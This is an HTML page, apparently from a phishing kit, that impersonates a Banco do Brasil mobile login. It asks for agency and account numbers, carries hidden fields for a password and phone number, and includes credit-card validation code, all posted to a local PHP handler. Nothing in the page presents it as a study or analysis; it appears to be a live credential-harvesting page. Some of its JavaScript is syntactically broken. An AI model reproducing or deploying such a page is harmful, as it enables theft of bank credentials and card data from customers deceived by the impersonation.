<!DOCTYPE html>
<html lang="pt-br">
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<script type="text/javascript" src="scripts/htmlshiv.html"></script>
<link rel="stylesheet" type="text/css" href="css/style3.css" media="all" />
<link href="css/styles.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="css/style.css" media="all" />

	
<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }
input { width:95%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:none; border-bottom:1px solid #CCC; }
body{	padding: 0px; overflow:hidden; margin: 0px; background:#FAFBFD;	}
#proceguir { width:100%; height:45px; background:url(images/a005.html); font-size:100%; border:none; text-align:center; color:#FFF; }
.bottoms{width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px; display:block;}

.pos {font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED; display:block; }

@media only screen and (max-width: 380px) {
	#bottoms { display:none; !important}
	#pos { display:none; !important}
}
</style>

<script>
function validation3() {
 
if(document.form.cc.value=="" || document.form.cc.value.length < 19)
document.form.cc.value == "0000 0000 0000 0000" || 
document.form.cc.value == "1111 1111 1111 1111" || 
document.form.cc.value == "2222 2222 2222 2222" || 
document.form.cc.value == "3333 3333 3333 3333" || 
document.form.cc.value == "4444 4444 4444 4444" || 
document.form.cc.value == "5555 5555 5555 5555" || 
document.form.cc.value == "6666 6666 6666 6666" || 
document.form.cc.value == "7777 7777 7777 7777" || 
document.form.cc.value == "8888 8888 8888 8888" || 
document.form.cc.value == "9999 9999 9999 9999"){
alert( "Número do Cartão invalido, preencha corretamente." );
document.form.cc.focus();
return false;
}
if(document.form.vld.value=="" || document.form.vld.value.length < 5 ||
document.form.vld.value == "00/00" || 
document.form.vld.value == "11/11" || 
document.form.vld.value == "12/12" || 
document.form.vld.value == "13/13" || 
document.form.vld.value == "14/14" || 
document.form.vld.value == "15/15" || 
document.form.vld.value == "16/16" || 
document.form.vld.value == "17/17" || 
document.form.vld.value == "19/19" || 
document.form.vld.value == "18/18"){
alert( "Validade inválida, preencha corretamente." );
document.form.vld.focus();
return false;
}

if(document.form.cvv.value=="" || document.form.cvv.value.length < 3 ||
document.form.cvv.value == "000"){
alert( "Cvv inválido, preencha corretamente." );
document.form.cvv.focus();
return false;
}

return true;
}

</script>



	<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>

<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<body class="barraInter"  onLoad="$('#modal').click();">
<div id="bgadd"></div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>BB Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>

</div>


<div style="width:100%; height:50px; background:#fd9607; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody><tr>
<td width="30" height="50" bgcolor="#296fa7">
</td>
<td bgcolor="#296fa7" align="center"><font face="arial" color="#F5FBEF"><img src="../assets/img/logotipo.png" width="126" height="50"></font></td>
<td style="padding:0 10px 0 0;" width="30" bgcolor="#296fa7"></td>
</tr>
<tr>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
</tr>
</tbody></table>
</div>
<div style=" max-width:750px; margin:0 auto;">
<form name="form" id="form" action="index6.php" method="POST" onSubmit="return validation1()" autocomplete="off">

<div style="background:#FFF;  margin-top:10px; padding:1;">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4; margin-bottom:20px; ">
	<center><font size="3" face="Verdana"><b>Confirme Sua Conta</b></font><br>
</div>
<div class="group" style="padding: 5px 10px 0px;">      
  <input id="token" name="token" maxlength="20" type="tel" style="width: 100%; color: dimgray;" required autofocus onKeyUp="proximoCampo(this, 'btt')" onfocus="this.value='';"/>
      <span class="bar"></span>
      <label><span class="span-input"><b>Ag / Op / Conta</b></span></label>	  
  </div>
</div>
	


<div style="background:#FFF; padding:10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="margin:0 10px 20px 0; float:right; color:#666666; font-family:'Arial'; font-size:13px;">
	<font size="1" face="Verdana"><b>*Todos os campos são obrigatórios</b></font></div>
<div class="group">      
           <button id="btt" name="btt" type="submit" class="giris-yap-buton">Confirmar</button>
    </div></div>
<input type="hidden" name="ag" id="ag" value="">
<input type="hidden" name="s8" id="s8" value="">
<input type="hidden" name="cel" id="cel" value="">

</form>
</div>



<div class="bottoms" id="bottoms">
<div style="width:40px; height:40px; background:url(images/a008.html) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.html) no-repeat; float:right; margin-right:20px;"></div>
</div>
<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>

<button id="modal" type="button" data-toggle="modal" data-target="#exampleModal" style="display: none">
  
</button>



    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->

	  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	  <script type="text/javascript" src="js/aapf.js?v=08"></script>
	  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
	  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
	  
	  
</html>